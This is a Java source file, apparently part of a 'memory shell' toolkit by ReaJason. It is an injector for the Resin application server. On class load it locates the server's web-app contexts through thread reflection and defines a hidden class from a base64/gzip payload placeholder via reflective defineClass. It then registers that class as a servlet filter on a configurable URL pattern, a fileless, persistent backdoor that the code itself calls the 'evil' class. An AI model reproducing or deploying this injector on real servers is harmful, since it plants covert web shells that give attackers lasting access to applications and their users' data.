package com.reajason.javaweb.memsell.resin.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class ResinFilterInjector {

    static {
        new ResinFilterInjector();
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }


    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public ResinFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void addFilter(Object context, Object filter) throws Exception {
        String filterClassName = filter.getClass().getName();
        if (isInjected(context, filterClassName)) {
            System.out.println("filter already injected");
            return;
        }
        try {
            Class<?> filterMappingClass;
            try {
                filterMappingClass = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
            } catch (Exception e) {
                filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
            }
            Object filterMappingImpl = filterMappingClass.newInstance();
            invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            Object urlPattern = invokeMethod(filterMappingImpl, "createUrlPattern");
            invokeMethod(urlPattern, "addText", new Class[]{String.class}, new Object[]{getUrlPattern()});
            invokeMethod(urlPattern, "init");
            invokeMethod(context, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMappingImpl});
            invokeMethod(context, "clearCache");
            System.out.println("filter injected");
        } catch (Throwable e) {
            System.out.println("filter inject failed");
            e.printStackTrace();
        }
    }

    public List<Object> getContext() {
        Set<Object> contexts = new HashSet<Object>();
        try {
            Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
            for (Thread thread : threads) {
                Class<?> servletInvocationClass = null;
                try {
                    servletInvocationClass = thread.getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                } catch (Exception e) {
                    continue;
                }
                if (servletInvocationClass != null) {
                    Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
                    Object webApp = invokeMethod(contextRequest, "getWebApp", new Class[0], new Object[0]);
                    if (webApp != null) {
                        contexts.add(webApp);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Arrays.asList(contexts.toArray());
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return filter;
    }

    public boolean isInjected(Object context, String evilClassName) throws Exception {
        Map<String, Object> filters = (Map) getFV(getFV(context, "_filterManager"), "_filters");
        for (String key : filters.keySet()) {
            if (key.contains(evilClassName)) {
                return true;
            }
        }
        return false;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

}